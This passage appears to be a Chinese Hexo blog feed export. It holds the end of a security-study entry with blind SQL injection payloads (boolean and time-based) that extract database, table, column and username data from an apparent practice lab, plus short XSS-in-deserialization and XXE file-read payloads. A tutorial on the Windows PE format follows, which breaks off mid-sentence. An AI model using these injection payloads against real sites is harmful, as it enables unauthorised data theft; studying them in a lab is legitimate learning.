class="line"><span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">database</span>())=<span class="number">2</span>;  求数据库名长度并判断是否等于2</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;p&#x27;</span>; 查看数据名的第一个字符并判断是否是p</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">2</span>,<span class="number">1</span>)=<span class="string">&#x27;k&#x27;</span>; 查看数据名的第二个字符并判断是否是k</span><br><span class="line"></span><br><span class="line">判断是否有盲注</span><br><span class="line">kobe&#x27; and 1=1<span class="comment"># //正常查询</span></span><br><span class="line">kobe&#x27; and 1=2<span class="comment"># //返回了不一样的结果</span></span><br><span class="line"></span><br><span class="line">1. 获取基本信息</span><br><span class="line">获取数据库名的长度</span><br><span class="line">kobe&#x27; and length(database())=2<span class="comment">#</span></span><br><span class="line">kobe&#x27; and length(database())&gt;1#</span><br><span class="line">kobe&#x27; and length(database())&lt;3#</span><br><span class="line"></span><br><span class="line">获取数据库名</span><br><span class="line">第一个字符</span><br><span class="line">kobe&#x27; and substr(database(),1,1)=&#x27;p&#x27;<span class="comment">#</span></span><br><span class="line">kobe&#x27; and ascii(substr(database(),1,1))=112<span class="comment">#</span></span><br><span class="line">第二个字符</span><br><span class="line">kobe&#x27; and substr(database(),2,1)=&#x27;k&#x27;<span class="comment">#</span></span><br><span class="line">kobe&#x27; and ascii(substr(database(),2,1))&gt;100#</span><br><span class="line">kobe&#x27; and ascii(substr(database(),2,1))&gt;105#</span><br><span class="line">kobe&#x27; and ascii(substr(database(),2,1))&gt;110#</span><br><span class="line"></span><br><span class="line">kobe&#x27; and ascii(substr(database(),2,1))=107<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">数据库名：pk</span><br><span class="line"></span><br><span class="line">2. 获取当前数据库的所有表名</span><br><span class="line">获取第一个表</span><br><span class="line"><span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">获取第一个表的第一个字符</span><br><span class="line">kobe<span class="string">&#x27; and substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;</span>pk<span class="string">&#x27; limit 0,1),1,1)=&#x27;</span>a<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">and</span> <span class="keyword">substr</span>((<span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;b&#x27;</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 获取表的列名</span><br><span class="line">获取<span class="keyword">users</span>表的列名,第一个列名</span><br><span class="line"><span class="keyword">select</span> COLUMN_NAME <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">and</span> TABLE_NAME=<span class="string">&#x27;users&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">获取<span class="keyword">users</span>表的列名,第一个列名的第一个字符</span><br><span class="line">kobe<span class="string">&#x27; and substr((select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=&#x27;</span>pk<span class="string">&#x27; and TABLE_NAME=&#x27;</span><span class="keyword">users</span><span class="string">&#x27; limit 0,1),1,1)=&#x27;</span>i<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4. 获取表中的内容</span></span><br><span class="line"><span class="string">select username from users</span></span><br><span class="line"><span class="string">select password from users</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查询第一个用户名的第一个字符</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">and</span> <span class="keyword">substr</span>((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;a&#x27;</span><span class="comment">#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27; and sleep(5)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">1. 获取基本信息</span><br><span class="line">获取数据库名的长度</span><br><span class="line">kobe&#x27; and if((length(database())=2),sleep(5),null)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">获取数据名的第一个字符</span><br><span class="line">kobe&#x27; and if((substr(database(),1,1)=&#x27;p&#x27;),sleep(5),null)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">2. 获取当前数据库的所有表名</span><br><span class="line"></span><br><span class="line">获取第一个表</span><br><span class="line"><span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">获取第一个表的第一个字符</span><br><span class="line">kobe<span class="string">&#x27; and if(substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;</span>pk<span class="string">&#x27; limit 0,1),1,1)=&#x27;</span>h<span class="string">&#x27;,sleep(5),null)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3. 获取表的列名</span></span><br><span class="line"><span class="string">获取users表的列名,第一个列名</span></span><br><span class="line"><span class="string">select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=&#x27;</span>pk<span class="string">&#x27; and TABLE_NAME=&#x27;</span><span class="keyword">users</span><span class="string">&#x27; limit 0,1</span></span><br><span class="line"><span class="string">获取users表的列名,第一个列名的第一个字符</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> COLUMN_NAME <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">and</span> TABLE_NAME=<span class="string">&#x27;users&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;i&#x27;</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="literal">null</span>)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> 获取表中的内容</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"></span><br><span class="line">查询第一个用户名的第一个字符</span><br><span class="line">kobe<span class="string">&#x27; and if(substr((select username from users limit 0,1),1,1)=&#x27;</span>a<span class="string">&#x27;,sleep(5),null)#</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>payload:O:1:”S”:1:{s:4:”test”:s:29:”<script>alert('xss')</script>script&gt;”:}</p><h2 id="xxe漏洞"><a href="#xxe漏洞" class="headerlink" title="xxe漏洞"></a>xxe漏洞</h2><?xml version = "1.0"?><!DOCTYPE ANY[<!ENTITY f SYSTEM "file:///c:/hello.txt"><p>]&gt;</p><p><x>&f;</x></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows原理————PE文件</title>
      <link href="2020/12/05/PE%E6%96%87%E4%BB%B6/"/>
      <url>2020/12/05/PE%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是文件"><a href="#什么是文件" class="headerlink" title="什么是文件"></a>什么是文件</h1><p>  存储数据的实体。</p><p>  不同的文件是给不同的软件去使用的。不同的文件主要是格式不同。</p><p>  格式就是数组的排列组织方式</p><p>。软件读取文件，按照固定的形式去解析文件的。</p><h1 id="什么是PE文件"><a href="#什么是PE文件" class="headerlink" title="什么是PE文件"></a>什么是PE文件</h1><p>  （Portable  Executable）可执行 文件的缩写。这种类型的文件，是供windows系统解析，解析完了之后能够创建出进程去运行的文件。</p><h1 id="PE文件的头部信息"><a href="#PE文件的头部信息" class="headerlink" title="PE文件的头部信息"></a>PE文件的头部信息</h1><p>（DOS头，NT头，区段表）</p><p>我们学习PE文件学习的是什么呢？？学习的就是PE文件的格式，学习格式就是在学习一堆结构体。很多东西需要记忆。</p><p>为了便于我们记忆，需要一些辅助性的工具。</p><h2 id="PE文件粗略图"><a href="#PE文件粗略图" class="headerlink" title="PE文件粗略图"></a>PE文件粗略图</h2><img src="PE文件/pe1.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><h2 id="DOS头"><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>在windows系统中的可执行文件在设计的时候，考虑到了兼容性问题。在正常的可执行文件的一开始的部分。嵌入了一个DOS可执行文件。作用就是在MS-DOS系统下能够输出一行这个程序不是运行在此系统下的。</p><img src="PE文件/dos头.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>这里有两个字段是有用的：</p><p>第一个    e_magic  永远都是 0x4D  0x5A   0x5A4D  你需要知道大端和小端的知识。</p><p>最后一个  e_lfanew  它是真正的可执行文件的起始位置。</p><ul><li>实验一:假如我们修改了e_magic字段或者e_lfanew，PE文件是否还能运行？<ul><li>将e_magic修改为”OZ”，保存执行</li><li>将e_magic改回”MZ”，e_lfanew改为0x1000，保存执行</li></ul></li></ul><p>尝试之后不行，这两个字段是重要字段，抹掉程序就无法运行了。</p><ul><li>实验二：抹掉除了e_magic和e_lfanew之外的字段，可不可以。</li></ul><h3 id="怎么找到DOS头"><a href="#怎么找到DOS头" class="headerlink" title="怎么找到DOS头"></a>怎么找到DOS头</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lpImage是ReadFile打开文件后的写入的缓冲区（堆空间）</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line"><span class="comment">//pDos的e_magic字段，作为是否为PE文件的标志</span></span><br><span class="line">pDos-&gt;e_magic == IMAGE_DOS_SIGNATURE</span><br><span class="line"><span class="comment">//pDos的e_lfanew字段可以指向NT头的空间</span></span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;</span><br><span class="line"></span><br><span class="line"><span class="comment">//例：</span></span><br><span class="line"><span class="comment">//1 打开文件</span></span><br><span class="line">HANDLE hFile = CreateFile(</span><br><span class="line">PATH,</span><br><span class="line">GENERIC_ALL,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2 获取文件大小</span></span><br><span class="line">DWORD dwFileSize = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//3 申请空间并初始化</span></span><br><span class="line"><span class="keyword">char</span>* buf = <span class="keyword">new</span> <span class="keyword">char</span>[dwFileSize] &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//4 读取文件</span></span><br><span class="line">DWORD dwRealSize = <span class="number">0</span>;</span><br><span class="line">ReadFile(hFile, buf, dwFileSize, &amp;dwRealSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="NT头"><a href="#NT头" class="headerlink" title="NT头"></a>NT头</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD Signature;                        <span class="comment">// [0x00]PE标识</span></span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;           <span class="comment">// [0x04]文件头</span></span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader; <span class="comment">// [0x18]扩展头</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><p>怎么找到Nt头?</p><p>通过DOS头的最后一个字段：e_lfanew 指定的是NT头的位置</p><p>Signature： </p><p>标识：PE00</p><p>可以和魔数配合，判断是否是PE文件。</p><p>永远都是  0x50  0x45  0x00  0x00  0x00004550  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打开PE文件后，第一个段就是DOS头部</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line"><span class="comment">//pDos的e_lfanew字段可以指向NT头的空间，使用NT头接收</span></span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;</span><br></pre></td></tr></table></figure><p>IMAGE_FILE_HEADER：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">    WORD     Machine;        <span class="comment">//[0x04] （1）运行平台</span></span><br><span class="line">    WORD     NumberOfSections;<span class="comment">//[0x06] （2）区段的数量*</span></span><br><span class="line">    DWORD   TimeDateStamp;    <span class="comment">//[0x08] （3）文件创建时间</span></span><br><span class="line">    DWORD   PointerToSymbolTable;<span class="comment">//[0x0C] （4）符号表指针</span></span><br><span class="line">    DWORD   NumberOfSymbols;  <span class="comment">//[0x10] （5）符号的数量</span></span><br><span class="line">    WORD     SizeOfOptionalHeader;<span class="comment">//[0x14] （6）扩展头大小*</span></span><br><span class="line">    WORD     Characteristics;  <span class="comment">//[0x16] （7）文件属性</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><img src="PE文件/FileHead.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>重要的：</p><p>NumberOfSection：区段的数量</p><p>SizeOfOptionalHeader：扩展头的大小。因为扩展头中数据目录表的个数是不确定的。所以这里需要一个大小</p><p>有用的：</p><p>Machine：运行平台</p><p>TimeDateStamp：时间戳  表明是在什么时候编译的</p><p>手工解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">50 45 00 00 4C 01 05 00 91 CF 44 54 00 00 00 00</span><br><span class="line">00 00 00 00 E0 00 02 01 </span><br></pre></td></tr></table></figure><p>50 45 00 00  PE标识                </p><p>01 4C             运行平台</p><p>00                    没用</p><p>05                    区段数量</p><p>91 CF 44 54    时间戳</p><p>E0                    扩展头大小</p><p>0201                属性</p><p>因为大端小端，我们需要反过来看</p><h3 id="关于镜像，映像，虚拟地址，相对虚拟地址"><a href="#关于镜像，映像，虚拟地址，相对虚拟地址" class="headerlink" title="关于镜像，映像，虚拟地址，相对虚拟地址"></a>关于镜像，映像，虚拟地址，相对虚拟地址</h3><p>镜像：就是PE文件自身</p><p>映像：就是根据PE文件映射出来的，</p><p>虚拟地址：程序中的内存地址，就是虚拟地址。</p><p>相对虚拟地址：就是相对于加载基址的偏移。</p><h2 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h2><p>IMAGE_FILE_HEADER</p><h3 id="文件头结构体"><a href="#文件头结构体" class="headerlink" title="文件头结构体"></a>文件头结构体</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Machine;<span class="comment">//运行平台</span></span><br><span class="line">    WORD    NumberOfSections;<span class="comment">//区段的数量</span></span><br><span class="line">    DWORD   TimeDateStamp;<span class="comment">//文件创建的时间</span></span><br><span class="line">    DWORD   PointerToSymbolTable;<span class="comment">//符号表偏移</span></span><br><span class="line">    DWORD   NumberOfSymbols;<span class="comment">//符号个数</span></span><br><span class="line">    WORD    SizeOfOptionalHeader;<span class="comment">//扩展头大小</span></span><br><span class="line">    WORD    Characteristics;<span class="comment">//PE文件的一些属性</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><h3 id="怎么找到文件头"><a href="#怎么找到文件头" class="headerlink" title="怎么找到文件头"></a>怎么找到文件头</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打开PE文件后，第一个段就是DOS头部</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line"><span class="comment">//pDos的e_lfanew字段可以指向NT头的空间，使用NT头接收</span></span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;</span><br><span class="line"><span class="comment">//NT头结构体的第二个参数就是指向扩展头</span></span><br><span class="line">PIMAGE_FILE_HEADER pFile = (PIMAGE_FILE_HEADER)&amp;pNt-&gt;FileHeader;</span><br></pre></td></tr></table></figure><h2 id="扩展头"><a href="#扩展头" class="headerlink" title="扩展头"></a>扩展头</h2><p>IMAGE_OPTIONAL_HEADER：</p><h3 id="找到扩展头"><a href="#找到扩展头" class="headerlink" title="找到扩展头"></a>找到扩展头</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打开PE文件后，第一个段就是DOS头部</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line"><span class="comment">//pDos的e_lfanew字段可以指向NT头的空间，使用NT头接收</span></span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;</span><br><span class="line"><span class="comment">//NT头结构体的第三个参数就是指向扩展头</span></span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOption =  (PIMAGE_OPTIONAL_HEADER)&amp;pNt-&gt;OptionalHeader;</span><br></pre></td></tr></table></figure><h3 id="扩展头结构体"><a href="#扩展头结构体" class="headerlink" title="扩展头结构体"></a>扩展头结构体</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">// 标准域</span></span><br><span class="line">    WORD     Magic;<span class="comment">//[0x18] (1) 标志位</span></span><br><span class="line">    BYTE       MajorLinkerVersion; <span class="comment">//[0x1A] (2) 连接器主版本号</span></span><br><span class="line">    BYTE       MinorLinkerVersion; <span class="comment">//[0x1B] (3) 连接器子版本号</span></span><br><span class="line">    DWORD   SizeOfCode; <span class="comment">//[0x1C] (4) 所有代码段 的总大小</span></span><br><span class="line">    DWORD   SizeOfInitializedData; <span class="comment">//[0x20] (5) 所有初始化段总大小</span></span><br><span class="line">    DWORD   SizeOfUninitializedData;<span class="comment">//[0x24] (6) 所有未初始化段总大小</span></span><br><span class="line">    DWORD   AddressOfEntryPoint;<span class="comment">//[0x28] (7) 程序执行入口RVA*</span></span><br><span class="line">    DWORD   BaseOfCode; <span class="comment">//[0x2C] (8) 代码段起始RVA</span></span><br><span class="line">    DWORD   BaseOfData; <span class="comment">//[0x30] (9) 数据段起始RVA</span></span><br><span class="line">    <span class="comment">// NT 附加域</span></span><br><span class="line">    DWORD   ImageBase; <span class="comment">//[0x34] (10) 程序默认载入基地址*</span></span><br><span class="line">    DWORD   SectionAlignment; <span class="comment">//[0x38] (11) 内存中的段对齐值</span></span><br><span class="line">    DWORD   FileAlignment; <span class="comment">//[0x3C] (12) 文件中的段对齐值</span></span><br><span class="line">    WORD    MajorOperatingSystemVersion; <span class="comment">//[0x40] (13) 系统主版本号</span></span><br><span class="line">    WORD    MinorOperatingSystemVersion; <span class="comment">//[0x42] (14) 系统子版本号</span></span><br><span class="line">    WORD    MajorImageVersion; <span class="comment">//[0x44] (15) 自定义的主版本号</span></span><br><span class="line">    WORD    MinorImageVersion; <span class="comment">//[0x46] (16) 自定义的子版本号</span></span><br><span class="line">    WORD    MajorSubsystemVersion; <span class="comment">//[0x48] (17) 所需子系统主版本号</span></span><br><span class="line">    WORD    MinorSubsystemVersion; <span class="comment">//[0x4A] (18) 所需子系统子版本号</span></span><br><span class="line"> DWORD   Win32VersionValue;<span class="comment">//[0x4C] (19) 保留，通常为0x00</span></span><br><span class="line">    DWORD   SizeOfImage; <span class="comment">//[0x50] (20) 内存中映像总尺寸*</span></span><br><span class="line">    DWORD   SizeOfHeaders; <span class="comment">//[0x54] (21) 各个文件头的总尺寸*</span></span><br><span class="line">    DWORD   CheckSum; <span class="comment">//[0x58] (22) 映像文件校验和</span></span><br><span class="line">    WORD     Subsystem;                        <span class="comment">//[0x5C] (23) 文件子系统</span></span><br><span class="line">    WORD     DllCharacteristics; <span class="comment">//[0x5E] (24) DLL标志位</span></span><br><span class="line">    DWORD   SizeOfStackReserve;         <span class="comment">//[0x60] (25) 初始化栈大小</span></span><br><span class="line">    DWORD   SizeOfStackCommit;         <span class="comment">//[0x64] (26) 初始化实际提交栈大小</span></span><br><span class="line">    DWORD   SizeOfHeapReserve;         <span class="comment">//[0x68] (27) 初始化保留栈大小</span></span><br><span class="line">    DWORD   SizeOfHeapCommit;         <span class="comment">//[0x6C] (28) 初始化实际保留栈大小</span></span><br><span class="line">    DWORD   LoaderFlags;                       <span class="comment">//[0x70] (29) 调试相关，默认0x00</span></span><br><span class="line">    DWORD   NumberOfRvaAndSizes;  <span class="comment">//[0x74] (30) 数据目录表的数量*</span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[<span class="number">0x10</span>]; <span class="comment">//[0x78] (31) 数据目录表*</span></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><img src="PE文件/ExHead.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>非常重要的：</p><p>ImageBase：程序的默认加载基址。</p><p>AddressOfEntryPoint： 程序的入口点（EP）。</p><p>比较重要的：</p><p>SectionAlignment： 内存对齐   0x1000（因为一页内存是4KB）</p><p>FileAlignment：    文件对齐   0x200</p><p>SizeOfImage：     映像大小（我这个PE文件被加载到内存，占用空间应该是多大）</p><p>SIzeOfHeader：    头部大小  DOS头+NT头+区块表的大小。</p><p>NumberOfRvaAndSizes: 数据目录表的元素个数</p><p>DllCharacteristics： PE的一组属性。。。。</p><p>极为重要的：</p><h2 id="数据目录表"><a href="#数据目录表" class="headerlink" title="数据目录表"></a>数据目录表</h2><p>DataDirectory</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;打开PE文件后，第一个段就是DOS头部</span><br><span class="line">PIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">&#x2F;&#x2F;pDos的e_lfanew字段可以指向NT头的空间，使用NT头接收</span><br><span class="line">PIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;</span><br><span class="line">&#x2F;&#x2F;NT头结构体的第三个参数就是指向扩展头</span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOption &#x3D;  (PIMAGE_OPTIONAL_HEADER)&amp;pNt-&gt;OptionalHeader;</span><br><span class="line">&#x2F;&#x2F;扩展头最后一个参数就是数据目录表</span><br><span class="line">PIMAGE_DATA_DIRECTORY pDataDir &#x3D; pOption-&gt;DataDirectory;</span><br></pre></td></tr></table></figure><p>  描述了PE文件中16个非常重要的数据块的大小和位置。</p><img src="PE文件/DataDirTable.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><h3 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h3><h4 id="什么是导出"><a href="#什么是导出" class="headerlink" title="什么是导出"></a>什么是导出</h4><p>提供函数给其他模块使用的一种行为</p><h4 id="怎么导出"><a href="#怎么导出" class="headerlink" title="怎么导出"></a>怎么导出</h4><p>方法1：声明导出</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">Fun1</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">Fun2</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>方法2：def文件导出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXPORTS </span><br><span class="line">Fun3 @1 </span><br><span class="line">Fun4 @2 NONAME</span><br></pre></td></tr></table></figure><p>注意：NONAME 是只导出序号，没有名字</p><p>导出表的作用是什么? 没有它exe能运行吗?</p><p>用以记录本模块能够给其他模块提供的函数的信息。</p><p>函数名   函数地址   